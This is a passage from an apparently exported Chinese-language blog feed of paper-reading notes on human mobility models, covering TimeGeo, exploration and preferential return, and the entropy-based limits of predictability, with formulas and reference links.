</p><p>考虑两个状态:home和other。Home被认为是一个活跃度较低的状态，因为home状态的平均停留时间显著长于other状态。</p><p>1.个体在home状态出行可能性</p><p>当个体在家时，他的出行倾向被定义为$n_wP(t)$，<strong>代表他在一周内t时间间隔从家出发进行移动的可能性</strong>。其中:</p><ul><li><p>$n_w$统计了个体从家出发去其他位置移动的总数。</p></li><li><p>P(t)是在平均一周内全部人口的出行倾向。 </p><p>对通勤者和非通勤者来说，P(t)不同:</p><ul><li><p>非通勤者:在一周内的时间间隔t所有人口的出行数占所有出行的比例。(即$\sum_{t=1}^{1008}P(t)=1,t=1,2…,1008$)，捕捉了在一周内不同时间出行的预期变化。</p><p><img src="/2021/11/02/1102/image-20211111203522748.png" alt="image-20211111203522748"></p></li><li><p>通勤者:P(t)不包括往返工作地的出行(工作被看作是固定的活动)</p></li></ul></li></ul><p>两者的乘积，$n_wP(t)$定义了个体在家时在特定时间间隔t出行的概率。</p><p>2.个体在other状态出行可能性</p><p>为了刻画个体在other状态出行的倾向，作者介绍了dwell rate$\beta_1$，衡量了个体在相较于home状态的other状态的活跃(倾向出行)程度。</p><p>当一个个体在other状态的出行概率被定义为$\beta_1n_wP(t)$。通过捕捉个体从other状态移动的倾向，<strong>$\beta_1n_w$控制了活动的停留时间。其乘积越大，个体更倾向移动，所以他停留在其他位置的时间越短。</strong></p><p>3.在other状态选择移动后是否回家(选择连续进行out-of-home活动的可能性)</p><p>如果个体已经out-of-home，并在时间t选择移动，作者通过burst rate$\beta_2$ 来刻画他回家或者去其他额外位置 的选择。</p><p>定义个体从一个other位置O1到另一个额外other位置O2移动的可能性为$P(O_1\rightarrow O_2)=\beta_2n_wP(t)\beta_1n_wP(t)$</p><p>假定个体已经决定移动，他访问额外的other位置的概率正比于$\beta_2n_w$。回家或去额外的other位置两个选择的比率为:$\frac{P(O_1\rightarrow O_2)}{P(O_1\rightarrow H)}=\frac{\beta_2n_wP(t)}{1-\beta_2n_wP(t)}$</p><p>对于给定$\beta_2n_w$，当P(t)高时(代表在当前时间段人们倾向出行),人们更有可能访问额外的other位置;当P(t)低时,人们更有可能回家。</p><p>对于给定P(t),$\beta_2n_w$值越高，个体有更高的概率保持访问other位置，故他每天访问地点数N大。</p><h4 id="Spatial-Choices"><a href="#Spatial-Choices" class="headerlink" title="Spatial Choices"></a>Spatial Choices</h4><p> a rank-based exploration and preferential<br>return (r-EPR) mechanism(在原始EPR模型中结合基于空间距离的排名)</p><p>原始EPR模型的限制为缺少探索中选择新位置的机制。原始EPR模型随机在实证jump-size($\Delta r$)分布中抽取距离。为了描绘更能反映城市结构的探索机制，在本文中结合对探索新的位置基于排名的选择机制，即r-EPR模型。</p><p>选择机制:基于距移动始发地的距离，给每个可选目的地排名。在所有潜在的新目的地中，离现在位置最近的k=1…</p><p><strong>将第k个位置作为目的地的概率被量化为$P(k)\sim k^{-\alpha}$</strong></p><p><img src="/2021/11/02/1102/image-20211112144732374.png" alt="image-20211112144732374"></p><p>该图为对r-EPR模型的图示。可能的目的地使用颜色对不同选择概率进行区分。  地点距始发地越近，它被选择的概率越高。每个点代表从CDR数据中提取的进行other活动的位置。点的高度代表在附近区域可选目的地的密度。</p><h3 id="Role-of-Land-Use-on-Travel-Distance"><a href="#Role-of-Land-Use-on-Travel-Distance" class="headerlink" title="Role of Land Use on Travel Distance"></a>Role of Land Use on Travel Distance</h3><p>为了解释和量化土地利用(land use)对出行的影响，本文提出<strong>a hierarchical multiplicative cascade(层次乘法级联模型)</strong>进行分析。 </p><p>TimeGeo将位置的空间分布(在CDR数据中观测到的)作为输入。</p><p><img src="/2021/11/02/1102/image-20211112151048619.png" alt="image-20211112151048619"></p><p>该图展示了不同类型的位置(home/other)在两个尺度下的分布。AB图是home位置在不同分辨率下的分布，CD图释other位置在不同分辨率下的分布。</p><p>在较大网格尺度下，home和other位置在空间上是混合的，表现出高度的空间相关。在较小网格尺度下，home和other类型的土地利用分离变得清晰。</p><p><strong>层次乘法级联将感兴趣的区域划分为不同粒度的网格，量化不同尺度下各类土地利用的空间相关性。</strong></p><p>当前框架结合了影响探索机制空间选择的两个特征:<strong>(i)活动位置的空间分布 (ii)基于排名的位置选择</strong>。</p><p>为了量化家到Other位置(H-O)的出行距离，作者提出将家位置作为需求方D，other位置作为提供方S。</p><p>需要分析的整个区域为$\Omega_0$，作者渐进地使用边长$2^{-1},2^{-2},…,2^{-n}$将其分为$4^{1},4^{2},…,4^{n}$块。每次一个父块$\Omega_{i-1}$（分辨率i-1层）分为四个子块$\Omega_{i}$（分辨率i层）。</p><p>示意图如下:<br><img src="/2021/11/02/1102/image-20211116164858893.png" alt="image-20211116164858893"></p><p><strong>在分辨率为i层时，一次出行走出其所在起始块的概率</strong>为$P_&gt;(i)$</p><p><img src="/2021/11/02/1102/image-20211116165145462.png" alt="image-20211116165145462"></p><p>起始块超出概率$P_&gt;(i)$在不同块分辨率产生移动距离的分布。</p><p>其中</p><ul><li><p>M是在整个区域$\Omega_0$中总的提供方数量(即所有可选目的地:other位置)</p></li><li><p>$P_&gt;(k)$是k个在起始块的提供方不被选择的概率，代表基于排名的地点选择机制。</p></li><li><p>$f_{S_i,trip}(k)$是在起始块内找到k个提供方的概率，代表位置的地理分布。计算方式如下:</p><p><img src="/2021/11/02/1102/image-20211116173305962.png" alt="image-20211116173305962"></p><p>$f_{D_i,trip}(D)$是给定D需求在分辨率水平为i从起始块移动的条件概率。$f_{S_i|D_i}$是给定需求后供应的条件概率。Q是在整个研究区域中需求数。</p></li></ul><p>总的来说，要通过$P_{&gt;(i)}$量化移动距离,我们不仅需要每个类型位置的分布，而且需要它们在不同尺度上的相关性。</p><p>Materials and Methods相关资料:</p><p>对于给定子区域$\omega \sub \Omega_0$ ,$D(\omega)$是在$\omega$起始的出行数，$S(\omega)$是在$\omega$的出行目的地数。使用二元随机变量$X(\omega)=[D(\omega),S(\omega)]$来代表区域$\omega$中需求和提供地点数。<strong>其中X是由一个级联过程产生的，在这个过程中，不同空间尺度的波动以相乘的方式结合在一起。</strong></p><p>在一个通用的i块$\Omega_i$中，供应和需求是$W_i$和$S_i$,密度相关度量为$D_i^{‘}=D_i/|\Omega_i|$  $S_i^{‘}=S_i/|\Omega_i|$ </p><p>首先在初始块$\Omega_0$均匀测量供需密度$D^{‘}_0$和$S^{‘}_0$，然后逐步将初始块划分为$4^1,4^2,…,4^n$。在子块中的供需密度需乘以非负的随机因子$W_{D_i}$和$W_{S_i}$(平均值为1)，随机因子组成的向量$W_i=[W_{D_i},W_{S_i}]$是级联的生成器。</p><p>即使级联生成器在不同分辨率i下有独立取值，但它们的分量$W_{D_i}$和$W_{S_i}$在给定i中可能是互相依赖的。</p><p>在分辨率i−1和i下测量的密度关系式为</p><p><img src="/2021/11/02/1102/image-20211119203226257.png" alt="image-20211119203226257"></p><p>在更小尺寸的块中，空块不能被忽略。在这种情况下，最好将生成器建模为β级联，块要么为满，要么为空。二元β级联的生成器$W(i)=[W_{D(i)},W_{S(i)}]$具有一个离散分布，其概率质量集中在四个($W_D,W_S$)点:</p><p>$P_{00}$ at $(0,0)$  $P_{D0}$ at $(1/P_D,0)$  $P_{0S}$ at $(0,1/P_S)$ $P_{DS}$ at $(1/P_D,1/P_S)$</p><p>在一个给定的区域内，用层次乘法级联分析框架来描述人口和场所设施分布的协方差，考虑了区域特定空间结构对个体出行距离的影响。</p><p>这使得我们能够对城市土地利用的变化如何影响微观层面的个人出行行为和宏观层面的OD矩阵进行情景测试。</p><h3 id="Results"><a href="#Results" class="headerlink" title="Results"></a>Results</h3><h4 id="Extracted-Mobility-Features-from-Mobile-Phone-Data"><a href="#Extracted-Mobility-Features-from-Mobile-Phone-Data" class="headerlink" title="Extracted Mobility Features from Mobile Phone Data"></a>Extracted Mobility Features from Mobile Phone Data</h4><p>对每个个体，$n_w$直接从数据中提取，$\beta_1$和$\beta_2$使用时间马尔科夫模型进行标定(<strong>calibrate</strong>)。其余参数如排名选择机制的参数$\alpha$，偏好返回机制的参数$\gamma$,$\rho$在全部人口的聚合数据中提取。</p><p><img src="/2021/11/02/1102/image-20211116174011928.png" alt="image-20211116174011928"></p><p>该图为$\beta_1n_w,\beta_2n_w,n_w$的联合分布。绿点为最可能的参数组合$n_w=6.1,\beta_1n_w=22.4,\beta_2n_w=508.0$</p><h4 id="Simulated-Mobility-Features"><a href="#Simulated-Mobility-Features" class="headerlink" title="Simulated Mobility Features"></a>Simulated Mobility Features</h4><p>有了上述观测到的特征参数，TimeGeo模型可以在城市尺度产生长时间内个体每日移动轨迹。</p><p>以学生自愿收集的14-mo数据为例，固定家和工作地(学校)。使用模型框架来模拟灵活的Other活动的时空选择和家活动的时间选择。</p><p>计算该学生的个人参数，发现其burst rate$\beta_2$小于人口平均水平，说明其有更小的可能性产生连续的短时间活动。</p><p><img src="/2021/11/02/1102/image-20211116174956650.png" alt="image-20211116174956650"></p><p>该图为模拟该学生三天移动的结果。他每天主要在H-O(home-work)间进行移动，只有一些去Other位置的移动。该模型不仅捕捉到每天个体访问地点的数量，还捕捉了每天行程链更详细的构造。</p><p><img src="/2021/11/02/1102/image-20211116175329672.png" alt="image-20211116175329672"></p><p>该图展示了该学生每日移动的<strong>模体(motif)</strong>，作者使用结点代表位置，边代表位置之间发生的移动，并统计模体的分布。主导的模体是在一天中在两个位置之间移动。</p><p>TimeGeo模型的关键在于使用ICT记录产生个体移动轨迹。对于数据稀疏的个体(在30天中只有4 个不同的位置)，作者模拟他时空完整的移动轨迹:<br>在联合分布中选择两组参数$\beta_1,\beta_2,n_w$来产生这个用户的两组合成轨迹。</p><p><img src="/2021/11/02/1102/image-20211117155712292.png" alt="image-20211117155712292"></p><p>左图使用参数$n_w=6,\beta_1=4,\beta_2=23$</p><p>右图使用参数$n_w=6,\beta_1=10,\beta_2=73$</p><p>较大的$\beta_1$和$\beta_2$产生更多连续的out-of-home活动，访问更多地点。</p><p><img src="/2021/11/02/1102/image-20211117155946701.png" alt="image-20211117155946701"></p><p>该图展示了该用户通过这两组参数模拟的每日移动的模体，较小的参数更倾向于简单的模体，较大的参数有更复杂的活动链。</p><p>作者通过绘制三种不同参数个体(频繁移动/不太频繁移动/中值)停留时间($\Delta t$)和访问地点数(N)的分布发现不太频繁移动的个体明显有更长的停留时间和更少的位置访问。</p><p>为了量化模型模拟和实证数据分布之间的差异,作者使用KS检验( Kolmogorov–Smirnov test)。</p><p>两种极端个体(频繁移动/不太频繁移动)实证和模拟P($\Delta t$)的KS统计值为0.12和0.11,如果将他们的实证数据和中值个体模拟进行比较，KS值增加。同样，作者也计算了P(N)实证和模拟的KS值。<strong>这证实了包含个人特定参数来模拟时间选择的重要性。</strong></p><p>随后作者做了类似于消融实验的分析，来证明模型中的每个机制($n_w,\beta_1,\beta_2$,r-EPR)都是至关重要的。</p><p>对于dwell rate$\beta_1$,如果使之都为1，该模型不区分家和other活动的移动倾向，结果导致$P(\Delta t)$低估了短时间的出行，KS检验统计值从0.04增加至0.27。</p><p><img src="/2021/11/02/1102/image-20211119162259558.png" alt="image-20211119162259558"></p><p>对于burst rate$\beta_2$，模型是否带有这个参数P(N)分布的KS统计值为0.03和0.22。</p><p><img src="/2021/11/02/1102/image-20211119163026348.png" alt="image-20211119163026348"></p><p>$\beta_1$和$\beta_2$捕捉了灵活活动的爆发 ，来确保停留时间$P(\Delta t)$和访问地点的数目P(N)。</p><p>EF两图展示了有无偏好返回机制个体L-th位置访问频率对比和有无基于排名选择机制个体出行距离$\Delta r$对比来说明机制的重要性。</p><p>作者扩展用户(通勤者和非通勤者)到人群(年龄超过16岁)，并产生一个工作日的移动轨迹。作者<strong>使用模拟产生的移动轨迹和传统出行调查数据进行对比</strong>。</p><p>分别使用MTS(一个州的出行调查)和NHTS(国家家庭出行调查)</p><p><img src="/2021/11/02/1102/image-20211119164505567.png" alt="image-20211119164505567"></p><p>$P(\Delta t)$分布的KS检验值分别为0.23和0.59。发现调查数据和模拟数据之间的停留时间分布显著不同，这主要是因为在一天的调查中人们很少报告停留时间超过12小时的活动，而模拟使用的信息由活跃的手机用户的数据记录提供。</p><p><img src="/2021/11/02/1102/image-20211119164937417.png" alt="image-20211119164937417"></p><p>P(N)的分布相比较好，KS检验值为0.07和0.23。</p><p><img src="/2021/11/02/1102/image-20211119165132169.png" alt="image-20211119165132169"></p><p>$P(\Delta r)$模拟数据相比于MTS数据,KS检验值为0.24。<br>因为模型在选择选择返回地点时没有考虑行程距离，高估了长距离的行程。此处没有和NHTS进行比较是因为出行的空间层面取决于城市的特定扩展，在全国区域不同。</p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>TimeGeo模型可以根据任何城市的人口密度和场所设施分布灵活适应到不同应用场景。最低要求是要有人口和场所设施分布。</p><p>在目前的结果中，模型的探索和返回参数($\alpha,\rho,\gamma$)在人口中假定是相同的，个体的时间流动率假定独立于实际位置。在未来的研究中，随着更多的高频率和长时间的数据可用，有可能学习到提出参数个体层面的不同。以及在不同城市区域,不同人口结构和生活方式中模型参数的不同。</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="Markov-Chain"><a href="#Markov-Chain" class="headerlink" title="Markov Chain"></a>Markov Chain</h3><p><a href="https://zhuanlan.zhihu.com/p/26453269" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26453269</a></p><p><a href="https://www.zhihu.com/question/37588564" target="_blank" rel="noopener">https://www.zhihu.com/question/37588564</a></p><p>随机过程:随机过程使用一些统计模型，利用这些统计模型可以对自然界的一些事物进行预测和处理。</p><p>马尔科夫链是随机过程的一种，每个时刻具有状态分布。每个状态的转移是有概率的，即转移概率矩阵P，且它是保持不变。有了转移概率矩阵和初始状态分布，就可以推算出后续时刻的状态分布。</p><p><strong>马尔科夫链的状态分布只取决于现在，与过去无关。</strong></p><p>在第n+1刻的状态只跟第n刻的状态有关,与第n-1,n-2,n-3,…等时刻的状态是没有任何关系。在随机游走的例子里，下一刻走到什么地方只与这一刻有关。</p><p>非齐次马尔科夫链模型</p><p><a href="https://zhuanlan.zhihu.com/p/31999081" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/31999081</a></p><h3 id="KS检验"><a href="#KS检验" class="headerlink" title="KS检验"></a>KS检验</h3><p><a href="https://www.cnblogs.com/arkenstone/p/5496761.html" target="_blank" rel="noopener">https://www.cnblogs.com/arkenstone/p/5496761.html</a></p><p><a href="https://www.cnblogs.com/jiangkejie/p/11572205.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiangkejie/p/11572205.html</a></p><p>Kolmogorov-Smirnov是比较一个频率分布f(x)与理论分布g(x)或者两个观测值分布的检验方法。</p><p>其原假设H0:两个数据分布一致或者数据符合理论分布。D=max| f(x)- g(x)|，当实际观测值D&gt;D(n,α)则拒绝H0，否则则接受H0假设。其中D值计算两分布样本之间累积经验分布函数之差。</p><p>KS检验不需要知道数据的分布情况，可以算是一种非参数检验方法。</p><p>KS值越大，说明样本间差异越大。</p>]]></content>
    
    
    <categories>
      
      <category>Paper reading</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mobility model</tag>
      
      <tag>human mobility</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Modeling the scaling properties of human mobility</title>
    <link href="/2021/10/05/211005/"/>
    <url>/2021/10/05/211005/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="Abstarct"><a href="#Abstarct" class="headerlink" title="Abstarct"></a>Abstarct</h2><p>个人移动轨迹的jump size($\Delta r$)和waiting time($\Delta t$)符合胖尾分布，这说明<strong>连续时间随机游走模型(CTRW)</strong>与人类移动的相关性。</p><p>我们需要能描述移动轨迹统计特征的定量模型。本文使用人类移动的经验数据(empirical data)来说明CTRW模型的预测与实证结果存在系统性冲突。</p><p><strong>本文介绍控制人类移动的两个准则，建立一个个体移动的统计微观模型。</strong>该模型解释了经验观察到的标度定律(scaling laws)，同时也允许我们分析预测大多数相关的标度指数。</p><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>即使众多可用数据集在范围和分辨率上有显著不同，但在人类移动的一些定量特征上表现出一致。</p><p>例如，美钞的追踪和移动电话数据都表明描述人类移动轨迹的聚合jump-size($\Delta r$)和waiting-time($\Delta t$)符合胖尾分布，$\Delta r$ 表示连续观察之间个体移动覆盖的距离，$\Delta t$表示个体在同一位置花费的时间。这些发现说明个体移动轨迹可以被莱维飞行(Lévy flights)或CTRW很好地描述。</p><p>本文的目的是说明<strong>通过一系列的直接测量，个体移动轨迹遵循几个高度可复制的标度定律。</strong>然而这些定律中的许多要么不能被CTRW模型解释，要么直接与CTRW预测相矛盾，这说明缺乏一个能捕捉人类移动基础特征的模型框架。</p><p>为了解释观测到标度定律的来源，本文介绍了控制人类移动的两个准则，作为个体移动统计微观模型的起始点。本文提出的模型可以解释实证观测到的标度定律并允许我们分析预测相关的标度指数。</p><h2 id="Scaling-anomalies"><a href="#Scaling-anomalies" class="headerlink" title="Scaling anomalies"></a>Scaling anomalies</h2><p>本文使用两个数据集描述个体移动模式的特征。</p><p>D1记录了一年时间内三百万匿名移动手机用户的移动轨迹(CDR)。</p><p>D2记录了1000名注册基于位置服务的用户的位置，他们的位置在两周内每小时进行记录。</p><p>首先计算每小时位移，发现其符合$P(r)$~$|\Delta r|^{(-1-\alpha)}$并在$\Delta r$~100km处截断。</p><p>使用D2测量$\Delta t$,发现其符合$P(\Delta t)$~$|\Delta t|^{-1-\beta}$并在$\Delta t=17h$处截断。</p><p>以上观测到的分布结果遵循CTRW模型。</p><p><strong>作者提出以下三个实证观测结果，表明人类移动轨迹遵循可复制的标度定律，但也说明了CTRW模型在捕捉观测到的标度性质上的缺点。</strong></p><p><strong>(A)访问的不同位置数</strong></p><p>一个随机移动物体访问不同位置的数目遵循$S(t)$~$t^\mu$</p><p>在莱维飞行中$\mu=1$，在CTRW中$\mu=\beta$</p><p>本实验数据中观测到的$\mu=0.6±0.02$，小于CTRW预测的$\beta=0.8±0.1$</p><p>$\mu&lt;1$说明访问不同位置数在大时间尺度上的减缓，用户访问之前没访问过地点的趋势减少。</p><p><img src="/2021/10/05/211005/image-20211013171004927.png" alt="image-20211013171004927"></p><p>该图表现出不同的回转半径$r_g$对应的访问位置数$S(t)$。</p><p><strong>(B)访问频率</strong></p><p>在莱维飞行和CTRW模型中一个用户访问给定位置的概率是处处渐进(t $\to\infty$)一致的(f~const.)。</p><p>相反，人类访问模式相当不均匀，k-th最常访问位置的访问频率f遵循Zipf’s law</p><p>$f_k$~$k^{-\zeta}$   $\zeta\approx1.2\pm0.1$</p><p>这说明访问频率的分布遵循$P(f)$~$f^{-(1+1/\zeta)}$</p><p><img src="/2021/10/05/211005/image-20211013180010666.png" alt></p><p>该图反映出不同S值下用户访问k-th最常访问位置的访问频率$f_k$，实证数据很好地被$f_k$~$k^{-\zeta}$拟合。</p><p><strong>(C)极慢扩散</strong></p><p>CTRW模型预测均方距离(MSD)渐进符合$\left \langle \Delta x^2(t)  \right \rangle \sim t^\nu$ ($\nu=2\beta/\alpha$)</p><p>和P($\Delta r$)与P($\Delta t$)都有截断相同，MSD在$\nu=1$时收敛为布朗运动</p><p>然而这种收敛在我们的观测时间范围内太慢，不具有相关性。</p><p>CTRW模型预测我们观测个体的移动轨迹时间越长，他就会越偏离初始位置。</p><p>然而，人类每天都有回家的倾向，这说明简单扩散过程在二维空间中不循环，不能提供对人的移动进行描述。</p><p>本文的测量观测到了极慢扩散过程，MSD遵循一个比对数更慢的增长(对数增长:对数增长初期进步速度非常快，后面会越来越慢，最后几乎处于一个平台期)。MSD的极慢增长在扩散中是罕见的。</p><p><img src="/2021/10/05/211005/image-20211014174215813.png" alt="image-20211014174215813"></p><p>该图说明用户组的MSD($\left \langle \Delta x^2 \right \rangle^{\alpha/2}$)在不同的回转半径下的时间演化。使用t=1year的值对MSD值进行归一化。</p><p>橙色曲线表示渐近行为的分析预测，灰色曲线代表CTRW模型的分析预测。</p><p>插图:归一化MSD值在不同回转半径下比访问位置数S。</p><p>A-C的发现说明人类个体移动却是遵循可复制的标度定律，它的起源还有待发现。它们仍然说明莱维飞行和CTRW等空模型预测的系统性差异。本文的主要目标是提出一个不仅能解释异常A-C起源的模型，而且是描绘人类个体移动的自洽统计模型。</p><h2 id="Generic-mechanisms-and-individual-mobility-model"><a href="#Generic-mechanisms-and-individual-mobility-model" class="headerlink" title="Generic mechanisms and individual mobility model"></a>Generic mechanisms and individual mobility model</h2><p>建立模型时，作者遵循一系列模型的结果认为jump-size和waiting-time符合胖尾分布。</p><p>但只符合$\Delta r $和$\Delta t$的分布不足以解释标度定律A-C。</p><p>作者提出造成这种差异的主要原因是<strong>两个生成机制，exploration(探索)和preferential return(偏好返回)。</strong>这两个机制都是人类移动特有的，且在传统随机游走模型(莱维飞行/CTRW)中缺失的。</p><p><strong>(1)Exploration</strong></p><p>随机游走模型假定扩散的下一步独立于之前访问的地点。相反，标度定律A说明探索额外的位置的趋势随时间逐渐减小。</p><p>我们观察一个人的移动轨迹越久，就越难发现在他家/工作地附近还没访问过的位置。</p><p><strong>(2)Preferential return</strong></p><p>与随机游走模型的访问概率在空间中是随机和统一的相反，人类有明显的倾向返回他们之前频繁访问的位置，例如家或工作地。</p><p>本文提出包含以上两个机制的模型，能充分解释异常A-C。</p><p>该模型用来描述个体的移动轨迹。假设t=0时，个体在一些首选位置。经过waiting-time($\Delta t$)后在分布P($\Delta r$)中选择改变他的下一个位置。</p><p>我们假设个体有两个选择:</p><p>(1)Exploration:</p><p>个体移动到一个新位置(不同于他之前去过的S个位置)的概率为$P_{new}=\rho S^{-\gamma}$</p><p>他移动覆盖的距离$\Delta r$在分布P($\Delta r$)中选择， 方向随机选择，移动位置数S+=1。</p><p>(2)Preferiential return:</p><p>个体返回之前访问过的S个位置的概率为$P_{ret}=1-\rho S^{-\gamma}$</p><p>访问位置i的概率$\Pi_i$与该个体之前访问过该位置的次数成正比。</p><p>在网络或社会科学中，这一假设被称为 preferential attachment/ cumulative<br>advantage。</p><p><img src="/2021/10/05/211005/image-20211014155239397.png" alt="image-20211014155239397"></p><p>该图描述了本文提出的个体移动模型。从时间t开始，该用户之前访问过4个不同的位置(访问频率f和每个位置圆的大小成正比)。在时间t+$\Delta t $，该用户可以选择访问离他现在位置$\Delta r$的新位置，也可以返回到他之前访问过的位置，该位置由访问频率f决定。</p><h2 id="Model-predictions"><a href="#Model-predictions" class="headerlink" title="Model predictions"></a>Model predictions</h2><p>本文提到该模型适用于捕捉长期尺度模式，不能再现人类移动短期内的时间顺序和潜在相关性。我们选择关注渐近性质(asymptotic properties)不仅仅是由理论驱动的(旨在重现普遍模式而不是短暂模式)，也是出于实际考虑:许多人类移动驱动过程，从疾病传播到城市规划，都是由人类移动的渐近特征驱动。</p><p>为了实现短期时间更好的还原度，我们加入了人类移动特征的周期调整(24h和7d的周期;个体在晚上很少移动，在早上和傍晚更多移动)，也加入了空间移动的潜在相关性(B地在A和C之间,访问顺序A→B→C或C→B→A)。这些相关性进一步限制了人类的轨迹，在一定程度上是个人移动模式具有高度可预测性的原因。</p><p>提出动态抑制(dynamical quenching)和重复行为是人类轨迹独有的，本文提出的模型代表了对CTRW/Lévy-flight模型的改进，因为它捕捉人类流动性的特性。</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>1.Zipf’s law</p><p><a href="https://blog.csdn.net/historyasamirror/article/details/3125223" target="_blank" rel="noopener">https://blog.csdn.net/historyasamirror/article/details/3125223</a></p><p>在自然语言的语料库里，一个单词出现的频率与它在频率表里的排名成反比。</p><p>2.MSD</p><p><a href="http://blog.sciencenet.cn/home.php?mod=space&amp;uid=3388193&amp;do=blog&amp;id=1232344" target="_blank" rel="noopener">http://blog.sciencenet.cn/home.php?mod=space&amp;uid=3388193&amp;do=blog&amp;id=1232344</a></p><p>即均方位移(the mean square displacement )   </p><p> 在统计力学中，均方位移（MSD，均方位移或均方波动）是粒子随时间移动后的位置相对于参考位置的偏差的量度。它是随机运动中空间范围的最常见度量，可以被认为是对随机行者“探索”的系统部分进行度量。</p><p>MSD定义为t时刻的系综平均(集平均，某一时间点随机变量的期望)：</p><p><img src="/2021/10/05/211005/image-20211017163225739.png" alt="image-20211017163225739"></p><p>3.渐近分析</p>]]></content>
    
    
    <categories>
      
      <category>Paper reading</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mobility model</tag>
      
      <tag>human mobility</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Limits of Predictability in Human Mobility</title>
    <link href="/2021/08/19/819/"/>
    <url>/2021/08/19/819/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>提出一个问题:人类行为在多大程度上是可预测的?</p><p>通过测量每个个体的轨迹熵，作者发现用户的移动有93%的潜在可预测性</p><p>尽管个体在移动模式上有显著差异，但作者发现可预测性显著缺乏变化，很大程度上与用户定期移动的距离无关。</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>本文认为，在我们的直觉和当前的建模之间存在着根本性的鸿沟:</p><p>尽管我们很少认为我们的任何行为是随机的，但从一个不知道我们的动机和计划的外部观察者的角度来看，我们的活动模式很容易显得随机和不可预测。</p><p>但是，现在关于人类活动的模型基本上都是随机的。</p><p>在何种程度上，个体的行为是可预测的?</p><p>本文旨在通过人类移动探索可预测性的界限，量化规律(可预测)和随机(不可预测)之间的相互影响。</p><h3 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h3><p>观察期为3个月</p><p>从~1kw筛选出5w个体(访问超过两个地点，通话频率$f\ge0.5$)</p><p><img src="/2021/08/19/819/image-20210828004247531.png" alt="image-20210828004247531"></p><p>该图展示了两个移动模式不同用户的轨迹:</p><p>第一个用户在30km内移动了跨越22个信号塔的附近区域</p><p>第二个用户在90km内移动了跨越76个信号塔的附近区域</p><p>灰色线条代表对应塔的信号接收范围</p><p><img src="/2021/08/19/819/image-20210828004602771.png" alt="image-20210828004602771"></p><p>该图展现了上面两个用户的移动网络。</p><p>节点大小代表在该塔附近的通话频率(用户在该塔附近花费时间百分比)，线的宽度与在两塔之间的移动频率成正比。</p><p><img src="/2021/08/19/819/image-20210828082020160.png" alt="image-20210828082020160"></p><p>每个移动网络都有一个相关的动态模式，捕获用户访问塔的时间序列</p><p>该图表示第一个用户在一周内访问位置的时间序列。每一条竖线代表一次通话，颜色代表此次通话所在塔。</p><h3 id="Results"><a href="#Results" class="headerlink" title="Results"></a>Results</h3><h4 id="Entropy-pt1"><a href="#Entropy-pt1" class="headerlink" title="Entropy(pt1.)"></a>Entropy(pt1.)</h4><p>熵可能是描述时间序列的可预测性的最基本的量</p><p>本文定义了三个熵测量了每个用户的移动模式:</p><ul><li><p>随机熵: $S_i^{rand}=\log_2 N_i$  $N_i$是user i访问过的不同位置数</p><p>如果访问每个位置的概率相等，得到用户所在位置的可预测性程度</p></li><li><p>时间不相关熵:$S_i^{unc}=-\sum^{N_i}_{j=1}p_i(j)\log_2 p_i(j)$</p><p>$p_i(j)$是user i曾经访问位置j的概率，表现了访问模式的不同性</p></li><li><p>实际熵:$S_i=-\sum_{T_i^{‘}\subset T_i}P(T_i^{‘})\log_2[P(T_i^{‘})]$</p><p>实际熵不仅取决于访问频率，还包括访问节点的顺序和在每个位置花费的时间，故能捕捉到人移动模式的完整时空顺序。</p><p>$T_i=\{X_1,X_2,…,X_L\}$表示在每连续的一小时间隔用户i所在的位置的序列</p><p>$P(T_i)$是在轨迹$T_i$中找到特定时间顺序子序列$T_i^{‘}$的概率</p></li></ul><p>$S_i\le S_i^{unc}\le S_i^{rand}$</p><p>为了计算实际熵，我们需要用户连续的(例如 每小时)位置记录。但用户倾向于在短时间内拨打大部分电话，长时间内不进行通话，在此期间无法获取用户位置。由图C可以观察到间断性与突然爆发。</p><p>参数q描述收集数据的不完整性，表示用户位置未知所占比。</p><p><img src="/2021/08/19/819/image-20210828090257375.png" alt="image-20210828090257375"></p><p>该图为q的数据集中的分布。峰值在q=0.7附近，说明对一个用户，我们有70%的时间间隔没有位置更新，掩盖了用户的实际熵。</p><p>因此本文研究了不完整性的熵S(q),允许推测q=0时的熵。(?)</p><p>作者通过100个每小时都被记录位置的用户测试该方法的准确性，发现q&lt;0.8时表现良好，即数据集的92%。故移除5000个q最高的用户，使剩余用户满足q&lt;0.8<br><img src="/2021/08/19/819/image-20210828094211427.png" alt="image-20210828094211427"></p><p>该图为三个熵在数据集上的分布。$S_{rand}$=6达到峰值，说明<em>：</em>用户位置的每一次更新代表每小时6位的新位置，即用户随机选择他访问新位置的范围是$2^{S^{rand}}=64$ 个。</p><p>但是真实熵在S=0.8达到峰值，说明真实情况不是64个位置的范围，而是$2^{0.8}=1.74$ ,少于两个位置。</p><h4 id="pt2"><a href="#pt2" class="headerlink" title="pt2."></a>pt2.</h4><p>本文随后表示数据集中用户的回转半径符合胖尾分布，虽然大多数个体活动限制在1-10km，但也有一些用户经常移动覆盖数百千米。</p><p>这些差异表明，用户移动的可预测性也应该符合胖尾分布。即移动少的个体(熵小)应该更容易预测，移动多(回转半径大，熵大)更不容易预测。</p><p>本文使用参数$\Pi$ 来表示适当的预测算法可以正确预测用户未来的位置的可能性。</p><p>如果用户的熵为S,访问了N个位置，则他的$\Pi\le \Pi^{max}(S,N)$ 